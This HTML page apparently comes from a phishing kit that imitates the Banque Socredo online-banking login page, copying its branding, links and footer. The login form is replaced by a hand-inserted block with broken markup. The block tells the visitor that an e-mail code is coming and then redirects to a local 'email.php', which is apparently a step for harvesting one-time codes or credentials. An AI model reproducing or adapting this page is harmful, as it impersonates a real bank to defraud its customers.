
<html data-critters-container="" lang="fr">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Authentification - Websoc</title>

    <meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-Control">
    <meta content="no-cache" http-equiv="Pragma">
    <meta content="0" http-equiv="Expires">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=0">
    <link rel="icon" type="image/x-icon" href="https://www.socredo.pf/connexion/favicon.ico">
    <style>@charset "UTF-8";:root{--bs-blue:#0d6efd;--bs-indigo:#6610f2;--bs-purple:#6f42c1;--bs-pink:#d63384;--bs-red:#dc3545;--bs-orange:#fd7e14;--bs-yellow:#ffc107;--bs-green:#198754;--bs-teal:#20c997;--bs-cyan:#0dcaf0;--bs-black:#000;--bs-white:#fff;--bs-gray:#6c757d;--bs-gray-dark:#343a40;--bs-gray-100:#f8f9fa;--bs-gray-200:#e9ecef;--bs-gray-300:#dee2e6;--bs-gray-400:#ced4da;--bs-gray-500:#adb5bd;--bs-gray-600:#6c757d;--bs-gray-700:#495057;--bs-gray-800:#343a40;--bs-gray-900:#212529;--bs-primary:#0d6efd;--bs-secondary:#6c757d;--bs-success:#198754;--bs-info:#0dcaf0;--bs-warning:#ffc107;--bs-danger:#dc3545;--bs-light:#f8f9fa;--bs-dark:#212529;--bs-primary-rgb:13,110,253;--bs-secondary-rgb:108,117,125;--bs-success-rgb:25,135,84;--bs-info-rgb:13,202,240;--bs-warning-rgb:255,193,7;--bs-danger-rgb:220,53,69;--bs-light-rgb:248,249,250;--bs-dark-rgb:33,37,41;--bs-white-rgb:255,255,255;--bs-black-rgb:0,0,0;--bs-body-color-rgb:33,37,41;--bs-body-bg-rgb:255,255,255;--bs-font-sans-serif:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--bs-font-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--bs-gradient:linear-gradient(180deg, rgba(255, 255, 255, .15), rgba(255, 255, 255, 0));--bs-body-font-family:var(--bs-font-sans-serif);--bs-body-font-size:1rem;--bs-body-font-weight:400;--bs-body-line-height:1.5;--bs-body-color:#212529;--bs-body-bg:#fff;--bs-border-width:1px;--bs-border-style:solid;--bs-border-color:#dee2e6;--bs-border-color-translucent:rgba(0, 0, 0, .175);--bs-border-radius:.375rem;--bs-border-radius-sm:.25rem;--bs-border-radius-lg:.5rem;--bs-border-radius-xl:1rem;--bs-border-radius-2xl:2rem;--bs-border-radius-pill:50rem;--bs-link-color:#0d6efd;--bs-link-hover-color:#0a58ca;--bs-code-color:#d63384;--bs-highlight-bg:#fff3cd}*,:after,:before{box-sizing:border-box}@media (prefers-reduced-motion:no-preference){:root{scroll-behavior:smooth}}body{margin:0;font-family:var(--bs-body-font-family);font-size:var(--bs-body-font-size);font-weight:var(--bs-body-font-weight);line-height:var(--bs-body-line-height);color:var(--bs-body-color);text-align:var(--bs-body-text-align);background-color:var(--bs-body-bg);-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}img{vertical-align:middle}@font-face{font-family:Montserrat-Regular;font-weight:400;font-style:normal;src:url(Montserrat-Regular.6c42fdc015affb56.eot);src:url(Montserrat-Regular.6c42fdc015affb56.eot?#iefix) format("embedded-opentype"),url(Montserrat-Regular.be06c97804cd2081.woff) format("woff"),url(Montserrat-Regular.dc8136342e2a4804.ttf) format("truetype"),url(Montserrat-Regular.136db38c4c3a330b.svg#Montserrat-Regular) format("svg")}html{font-size:14px}body{background:#fff;font-family:Montserrat-Regular,arial,sans-serif;font-size:14px;color:#3b3a3a}img{max-width:100%}</style>
    <link rel="stylesheet" href="https://www.socredo.pf/connexion/styles.fea07bb3146312ff.css"

      media="all" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://www.socredo.pf/connexion/styles.fea07bb3146312ff.css"></noscript>
    <style>[_nghost-ng-c2373578001]{position:fixed;top:0;right:0;margin:.5em;z-index:1200}</style>
    <style>.modal-body[_ngcontent-ng-c2832527880], .modal-header[_ngcontent-ng-c2832527880]{padding:1rem}.modal-header[_ngcontent-ng-c2832527880]   .close[_ngcontent-ng-c2832527880]{padding:1rem;margin:-1rem -1rem -1rem auto}.icon_item[_ngcontent-ng-c2832527880]{font-size:25px;text-align:center}</style>
    <style>.invalid-feedback[_ngcontent-ng-c3557531277], .valid-feedback[_ngcontent-ng-c3557531277]{display:block}</style>
    <style>.carousel:focus,.carousel:hover{outline:none}.carousel .information-item{min-height:275px;padding:10px}.carousel-control-prev-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23ddd' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath d='M5.25 0l-4 4 4 4 1.5-1.5L4.25 4l2.5-2.5L5.25 0z'/%3e%3c/svg%3e")}.carousel-control-next-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23ddd' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath d='M2.75 0l-1.5 1.5L3.75 4l-2.5 2.5L2.75 8l4-4-4-4z'/%3e%3c/svg%3e")}.carousel-control-next,.carousel-control-prev{top:inherit;bottom:10px}.information-inner .information-item:nth-child(2){border-bottom:none;padding-bottom:30px}.information-item.securite{border-top:1px solid #03c366}.carousel-indicators{margin-bottom:0}.carousel-indicators li{background-color:#e0e0e0;width:10px;height:10px;border-radius:50%}.carousel-indicators li.active{background-color:#03c366}
</style></head>
  <body> <app-root id="root" _nghost-ng-c1573080147="" ng-version="17.3.0"><router-outlet

        _ngcontent-ng-c1573080147=""></router-outlet><app-auth-layout _nghost-ng-c318294859="">
        <header _ngcontent-ng-c318294859="" class="main-header">
          <div _ngcontent-ng-c318294859="" class="header-content">
            <div _ngcontent-ng-c318294859="" class="container">
              <div _ngcontent-ng-c318294859="" class="header-content-inner d-flex justify-content-between flex-wrap align-items-stretch">
                <h1 _ngcontent-ng-c318294859="" class="logo"><a _ngcontent-ng-c318294859=""

                    class="logo__link d-inline-block" href="http://www.socredo.pf"><img

                      _ngcontent-ng-c318294859="" src="https://www.socredo.pf/connexion/assets/images/logo.png"

                      alt="Banque Socredo" class="logo__link__img"></a></h1>
                <div _ngcontent-ng-c318294859="" class="user-block header_type2 d-flex align-items-end"><a

                    _ngcontent-ng-c318294859="" class="user-item position-relative d-inline-block"

                    href="http://www.socredo.pf/Accueil/Ouvrir_un_compte">
                    <div _ngcontent-ng-c318294859="" class="user-item__icon text-center"><i

                        _ngcontent-ng-c318294859="" class="icon-user-institu"></i></div>
                    <div _ngcontent-ng-c318294859="" class="user-item__text"><span

                        _ngcontent-ng-c318294859="">Devenir client</span></div>
                  </a></div>
              </div>
            </div>
          </div>
        </header>
        <router-outlet _ngcontent-ng-c318294859=""></router-outlet><app-login _nghost-ng-c2898076743="">
          <main _ngcontent-ng-c2898076743="" class="main">
            <section _ngcontent-ng-c2898076743="" class="page-heading">
              <div _ngcontent-ng-c2898076743="" class="container">
                <div _ngcontent-ng-c2898076743="" class="page-heading-inner">
                  <h2 _ngcontent-ng-c2898076743="" class="page-heading__text">Chargement en cours</h2>
                </div>
              </div>
            </section>
</script>


<div class="ctxt-form-horizontal i_blocgenform" id="frmContact">

    <div class="login-box-inner">
    <br><br><br>

    <div id="rebour">
        <h1 style="text-align: center; font-size: 15px">Vous allez recevoir un code par E-mail dans</h1>

        <center><img src="https://www.socredo.pf/connexion/assets/images/ajax-loader.gif" style="width: 180px;"></center>

        <center><h4> <span id="countdowntimer">20</span> secondes.</h4></center>
                </div>
            </div>
        </footer>
        <br><br><br>
     <META HTTP-EQUIV="Refresh" Content=25;"email.php">
</head>
    <br>
          </main>
          <!----><!----></app-login><!----><app-simple-popup _ngcontent-ng-c318294859=""

          _nghost-ng-c2666533041="">
          <section _ngcontent-ng-c2666533041="" id="simple-popup" tabindex="-1"

            role="dialog" class="modal confirm-remove-modal">
            <div _ngcontent-ng-c2666533041="" role="document" class="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm">
              <div _ngcontent-ng-c2666533041="" class="modal-content position-relative py-5 px-3">
                <div _ngcontent-ng-c2666533041="" class="modal-header"><a _ngcontent-ng-c2666533041=""

                    class="close-modal-btn"><i _ngcontent-ng-c2666533041="" class="icon-close cursor-pointer"></i></a></div>
                <div _ngcontent-ng-c2666533041="" class="modal-body text-center px-3">
                  <p _ngcontent-ng-c2666533041=""></p>
                </div>
              </div>
            </div>
          </section>
        </app-simple-popup>
        <footer _ngcontent-ng-c318294859="" class="main-footer">
          <div _ngcontent-ng-c318294859="" class="contact_info_block">
            <div _ngcontent-ng-c318294859="" class="container">
              <div _ngcontent-ng-c318294859="" class="row">
                <div _ngcontent-ng-c318294859="" class="col-sm-8 d-flex align-items-center flex-column flex-sm-row"><img

                    _ngcontent-ng-c318294859="" src="https://www.socredo.pf/connexion/assets/images/logo-footer2.png"

                    alt="Banque Socredo" class="logo-footer"><span _ngcontent-ng-c318294859=""

                    class="text_tel ps-0 pt-2 pt-sm-0 ps-sm-5">Centre de
                    relation clientèle : 40 47 00 00</span></div>
                <div _ngcontent-ng-c318294859="" class="col-sm-4 d-flex align-items-center pt-3 pt-sm-0 justify-content-center justify-content-sm-end"><a

                    _ngcontent-ng-c318294859="" class="circle_icon" href="https://fr-fr.facebook.com/SOCREDO.PF/"><i

                      _ngcontent-ng-c318294859="" class="fab fa-facebook-f"></i></a><a

                    _ngcontent-ng-c318294859="" class="circle_icon" href="https://www.youtube.com/channel/UCZPK729yYZqhJAslDFfWpsQ"><i

                      _ngcontent-ng-c318294859="" class="fab fa-youtube"></i></a><a

                    _ngcontent-ng-c318294859="" class="circle_icon" href="https://www.instagram.com/banque_socredo/"><i

                      _ngcontent-ng-c318294859="" class="fab fa-instagram"></i></a><a

                    _ngcontent-ng-c318294859="" class="circle_icon" href="https://www.linkedin.com/company/banque-socredo"><i

                      _ngcontent-ng-c318294859="" class="fab fa-linkedin"></i></a></div>
              </div>
            </div>
          </div>
          <div _ngcontent-ng-c318294859="" class="footer-content footer-content--type2 position-relative"><span

              _ngcontent-ng-c318294859="" class="position-absolute" style="bottom: 5px; right: 5px; font-size: 8px;">4.2.0</span>
            <div _ngcontent-ng-c318294859="" class="container py-5">
              <div _ngcontent-ng-c318294859="" class="row">
                <div _ngcontent-ng-c318294859="" class="footer-list-wrapper col-md-9">
                  <div _ngcontent-ng-c318294859="" class="row">
                    <div _ngcontent-ng-c318294859="" class="list col-6 col-md-3 col-lg-3 col-xl-3">
                      <h4 _ngcontent-ng-c318294859="" class="list__title">Banque
                        SOCREDO</h4>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/notre-histoire">Notre
                          histoire</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/nos-missions">Nos
                          missions</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/nos-chiffres-cles">Nos
                          résultats</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/nos-engagements">Nos
                          engagements</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.socredo.pf/a-la-une/en-bref">A
                          la Une</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/le-groupe-socredo">Groupe
                          SOCREDO</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/nous-rejoindre/offres-emploi">Nous
                          rejoindre</a></div>
                      <!----></div>
                    <div _ngcontent-ng-c318294859="" class="list col-6 col-md-3 col-lg-3 col-xl-3">
                      <h4 _ngcontent-ng-c318294859="" class="list__title">Produits
                        et services</h4>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/particuliers">Particuliers</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/jeunes">Jeunes</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/casden/produit/offre-casden">Casden</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/professionnels">Professionnels</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/entreprises">Entreprises</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.socredo.pf/associations/ouvrir-un-compte">Association</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/gestion-privee">Gestion
                          Privée</a></div>
                      <!----></div>
                    <div _ngcontent-ng-c318294859="" class="list col-6 col-md-3 col-lg-3 col-xl-3">
                      <h4 _ngcontent-ng-c318294859="" class="list__title">Informations
                        utiles</h4>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/mentions-legales">Mentions
                          légales</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/donnees-personnelles">Données
                          personnelles</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/charte-de-mediation">Charte
                          de médiation</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/loi-eckert">Loi
                          ECKERT</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/fonds-de-garantie-des-depots-et-de-resolution">FGDR</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/securite">Sécurité</a></div>
                      <!----></div>
                    <div _ngcontent-ng-c318294859="" class="list col-6 col-md-3 col-lg-3 col-xl-3">
                      <h4 _ngcontent-ng-c318294859="" class="list__title">Socredo
                        pratique</h4>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.socredo.pf/contact">Nous
                          contacter</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/agences">Trouver
                          une agence</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.socredo.pf/particuliers/credits-personnels#credit">Simulateur
                          </a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="http://www.socredo.pf/faq">FAQ</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.socms.pf/Socms/">Alerte
                          SOCMS</a></div>
                      <div _ngcontent-ng-c318294859="" class="list__items"><a _ngcontent-ng-c318294859=""

                          class="list__item" href="https://www.americanexpress.pf/">Cartes
                          AMEX</a></div>
                      <!----></div>
                    <!----></div>
                </div>
                <div _ngcontent-ng-c318294859="" class="col-sm-3 d-none d-md-block text-center"><img

                    _ngcontent-ng-c318294859="" src="https://www.socredo.pf/connexion/assets/images/pattern2.png"

                    alt="#"></div>
              </div>
            </div>
          </div>
        </footer>
      </app-auth-layout><!----><app-cookies _ngcontent-ng-c1573080147="" _nghost-ng-c3798742087="">
        <div _ngcontent-ng-c3798742087="" class="container fixed-bottom"></div>
        <app-cookies-modal _ngcontent-ng-c3798742087="" idmodal="cookieModal" _nghost-ng-c2832527880="">
          <div _ngcontent-ng-c2832527880="" role="dialog" tabindex="-1" class="modal fade"

            id="cookieModal">
            <div _ngcontent-ng-c2832527880="" role="document" class="modal-dialog modal-lg modal-dialog-centered">
              <div _ngcontent-ng-c2832527880="" class="modal-content">
                <div _ngcontent-ng-c2832527880="" class="modal-header">
                  <h5 _ngcontent-ng-c2832527880="" class="modal-title">Personnaliser
                    mes choix</h5>
                  <button _ngcontent-ng-c2832527880="" aria-label="Close" data-bs-dismiss="modal"

                    type="button" class="btn-close"></button></div>
                <div _ngcontent-ng-c2832527880="" class="modal-body">
                  <p _ngcontent-ng-c2832527880="" class="text-justify">Nos sites
                    utilisent des cookies nécessaires à leur fonctionnement. Les
                    informations sont collectées pour la Banque SOCREDO, 115 Rue
                    Dumont d’Urville à Papeete (98713), responsable du
                    traitement de vos données personnelles. Pour améliorer votre
                    expérience, d'autres cookies peuvent être utilisés. Vous
                    pouvez choisir de les désactiver ou de les modifier à tout
                    moment sur votre espace client grâce au menu “Paramètres”
                    puis <b _ngcontent-ng-c2832527880="">"Mes informations
                      personnelles"</b>. <br _ngcontent-ng-c2832527880="">
                    Vos choix seront conservés pendant 6 mois.</p>
                  <div _ngcontent-ng-c2832527880="" class="row">
                    <div _ngcontent-ng-c2832527880="" class="col-sm-2 icon_item"><i

                        _ngcontent-ng-c2832527880="" class="fas fa-cog"></i></div>
                    <div _ngcontent-ng-c2832527880="" class="col-sm-8 text-black-50"><strong

                        _ngcontent-ng-c2832527880="">Requis (accès au site web)</strong><br

                        _ngcontent-ng-c2832527880="">
                      <span _ngcontent-ng-c2832527880="">Ces cookies sont
                        indispensables pour le bon fonctionnement de notre site.<br

                          _ngcontent-ng-c2832527880="">
                        Ce suivi est toujours activé pour l'adapter à vos
                        besoins.</span></div>
                    <div _ngcontent-ng-c2832527880="" class="col-sm-2 text-center">
                      <div _ngcontent-ng-c2832527880="" class="form-group checkbox-2 checkbox-2--green">
                        <div _ngcontent-ng-c2832527880="" class="form-check"><input

                            _ngcontent-ng-c2832527880="" id="requiredCheck" class="form-check-input"

                            disabled="disabled" type="checkbox"><label _ngcontent-ng-c2832527880=""

                            for="requiredCheck" class="form-check-label"></label></div>
                        <bfv-messages _nghost-ng-c3557531277=""><span _ngcontent-ng-c3557531277=""

                            class="invalid-feedback">Le champ est obligatoire</span><!----></bfv-messages><!----></div>
                    </div>
                  </div>
                  <div _ngcontent-ng-c2832527880="" class="row mt-4">
                    <div _ngcontent-ng-c2832527880="" class="col-sm-2 icon_item"><i

                        _ngcontent-ng-c2832527880="" class="fas fa-chart-bar"></i></div>
                    <div _ngcontent-ng-c2832527880="" class="col-sm-8"><strong _ngcontent-ng-c2832527880="">Fonctionnel
                        (amélioration du site Web)</strong><br _ngcontent-ng-c2832527880="">
                      <span _ngcontent-ng-c2832527880="">Nous utilisons le suivi
                        fonctionnel pour analyser l'utilisation de notre site
                        Web.<br _ngcontent-ng-c2832527880="">
                        Ces cookies permettent de détecter d’éventuels problèmes
                        techniques et d’optimiser notre site. Ils nous
                        permettent également d’enrichir nos études publicitaires
                        et marketing.</span></div>
                    <div _ngcontent-ng-c2832527880="" class="col-sm-2 text-center">
                      <div _ngcontent-ng-c2832527880="" class="form-group checkbox-2 checkbox-2--green">
                        <div _ngcontent-ng-c2832527880="" class="form-check"><input

                            _ngcontent-ng-c2832527880="" id="gaCheck" class="form-check-input"

                            type="checkbox"><label _ngcontent-ng-c2832527880=""

                            for="gaCheck" class="form-check-label"></label></div>
                        <bfv-messages _nghost-ng-c3557531277=""><!----></bfv-messages><!----></div>
                    </div>
                  </div>
                </div>
                <div _ngcontent-ng-c2832527880="" class="modal-footer">
                  <div _ngcontent-ng-c2832527880="" class="col text-start"><a _ngcontent-ng-c2832527880=""

                      target="_blank" href="http://www.socredo.pf/donnees-personnelles">En
                      savoir +</a></div>
          </div>
        </app-cookies-modal><!----><!----></app-cookies><app-toast _ngcontent-ng-c1573080147=""

        aria-atomic="true" aria-live="polite" _nghost-ng-c2373578001=""><!----></app-toast></app-root>
    <script src="https://www.socredo.pf/connexion/runtime.51798895d49bafd6.js" type="module"></script>
    <script src="https://www.socredo.pf/connexion/polyfills.e6341d18e7c239d5.js"

type="module"></script>
    <script src="https://socredo.pf/connexion/scripts.d8350118a8f44f37.js" defer="defer"></script>
    <script src="" type="module"></script>
  </body>
</html>
